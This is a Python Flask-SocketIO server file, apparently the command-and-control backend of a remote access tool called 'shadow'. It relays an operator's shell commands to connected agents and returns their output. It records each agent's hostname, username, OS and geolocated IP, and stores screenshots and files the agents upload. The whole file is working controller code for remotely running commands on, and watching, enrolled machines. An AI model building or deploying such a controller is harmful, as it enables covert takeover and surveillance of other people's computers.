import base64
import os
import requests
from datetime import datetime

from flask import json, request, current_app, url_for, Blueprint
from flask_socketio import join_room, emit
from werkzeug.utils import secure_filename

from shadow.extensions import socketio
from shadow.models import Agent, db

socketio_bp = Blueprint('socketio', __name__)


@socketio.on('connect', namespace='/web')
def web_connect():
    print('web connect...')


@socketio.on('joined', namespace='/web')
def joined(message_body):
    print('有新客户端连接：' + message_body['agent_id'])
    room = message_body['agent_id']
    join_room(room)

    emit('status', {'msg': str(message_body['agent_id']) + ' has entered the room.'}, room=room)


@socketio.on('left', namespace='/web')
def leave(message_body):
    print('有客户端失去连接：' + message_body['agent_id'])


@socketio.on('command', namespace='/web')
def get_command(message_body):
    print('client agent id：' + message_body['agent_id'])
    print('client agent command：' + message_body['command'])
    cmd = message_body['command']
    room = message_body['agent_id']

    result_cmd = 'root# ' + cmd

    emit('command', result_cmd, room=room)
    put_command(cmd, room)


def put_command(cmd, room):
    print('正在将消息转送到 /api ...')
    emit('command', {
        'cmd': cmd,
        'room': room
    }, namespace='/api', room=room)
    print('消息转发完毕')


@socketio.on('hello', namespace='/api')
def hello(message_body):
    print('收到心跳包，来自 agent id：' + message_body['id'])
    uid = message_body['id']
    room = uid
    join_room(uid)

    agent = Agent.query.get(uid)
    url = 'http://ip.taobao.com/service/getIpInfo.php?ip=' + request.remote_addr
    message = requests.get(url)

    if not agent:
        agent = Agent(uid)
        agent.user_email = message_body['email']
        db.session.add(agent)
        db.session.commit()
    if 'platform' in message_body:
        agent.operating_system = message_body['platform']
    if 'hostname' in message_body:
        agent.hostname = message_body['hostname']
    if 'username' in message_body:
        agent.username = message_body['username']
    if message.status_code == 200:
        get_geolocation = json.loads(message.content.decode())
        geolocation = get_geolocation['data']['city']
        agent.geolocation = geolocation
    agent.last_online = datetime.now()
    agent.remote_ip = request.remote_addr
    db.session.commit()
    emit('hello', {
        'message': '心跳包响应成功.'
    }, room=room)


@socketio.on('command', namespace='/api')
def api_command(message_body):
    print('server agent message：')
    print(message_body)
    emit('command', message_body['output'], namespace='/web', room=message_body['room'])


@socketio.on('upload', namespace='/api')
def upload(message_body):
    agent_id = message_body['room']
    filename = message_body['file']
    data = message_body['data']
    print('收到客户端截图响应 agent id：' + agent_id)
    upload_dir = os.path.join(current_app.config['UPLOAD_FOLDER'])
    agent_dir = agent_id
    store_dir = os.path.join(upload_dir, agent_id)
    filename = secure_filename(filename)
    if not os.path.exists(store_dir):
        os.makedirs(store_dir)
    file_path = os.path.join(store_dir, filename)
    while os.path.exists(file_path):
        filename = "_" + filename
        file_path = os.path.join(store_dir, filename)
    img_data = base64.b64decode(data)
    file = open(file_path, 'wb')
    file.write(img_data)
    file.close()
    download_link = url_for('agent.uploads', path=agent_dir + '/' + filename)
    output = '[*] File uploaded: <a target="_blank" href="' + download_link + '">' + download_link + '</a>\n'
    emit('upload', output, namespace='/web', room=agent_id)
